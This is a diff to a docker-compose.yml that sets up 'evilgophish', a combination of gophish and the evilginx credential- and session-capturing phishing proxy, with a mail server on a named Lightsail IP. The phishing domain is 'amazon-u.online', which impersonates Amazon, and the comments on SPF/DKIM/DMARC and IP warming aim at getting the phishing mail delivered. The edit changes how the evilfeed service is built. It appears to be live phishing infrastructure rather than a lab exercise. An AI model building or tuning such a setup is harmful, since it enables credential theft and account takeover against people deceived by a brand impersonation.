@@ -1,6 +1,6 @@
 # docker-compose.yml
 # Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
-# Changes: Domain amazon-u.online; Turnstile optional; uses src/evilginx3; validates src; ensures mailconfig; makes evilfeed optional.
+# Changes: Domain amazon-u.online; Turnstile optional; uses src/evilginx3; validates src; ensures mailconfig; makes evilfeed optional; builds evilfeed from evilfeed.go.
 # Services: nginx (proxy), gophish (campaigns), evilginx (phishing), evilfeed (real-time, optional), mailserver (SMTP).
 # Volumes: Persistent for data/logs/uploads; mailconfig for DKIM/postfix.
 # Ports: 80/443 (web), 25/465/587 (SMTP), 3333/1337 (local admin/feed).
@@ -8,7 +8,7 @@
 # - DNS: Lightsail zone for amazon-u.online; SPF/DKIM/DMARC for deliverability.
 # - Security: Restrict ports; use secrets for credentials.
 # - Deliverability: Warm IP; monitor maillogs.
-# - Troubleshooting: Check src/evilginx3, src/gophish; verify mailconfig/opendkim.
+# - Troubleshooting: Check src/evilginx3, src/gophish, src/evilfeed; verify mailconfig/opendkim.
 
 services:
   nginx:
@@ -105,12 +105,9 @@ services:
     build:
       context: .
       dockerfile: Dockerfile.evilfeed
+    # Ensure src/evilfeed/evilfeed.go exists before starting this service
     depends_on:
-      - gophish  # Ensure gophish starts first
-    entrypoint: >
-      sh -c "
-        [ -f src/evilfeed/main.go ] && ./evilfeed || echo 'src/evilfeed/main.go not found, skipping evilfeed'
-      "
+      - gophish
     ports:
       - "127.0.0.1:1337:1337"
     volumes:
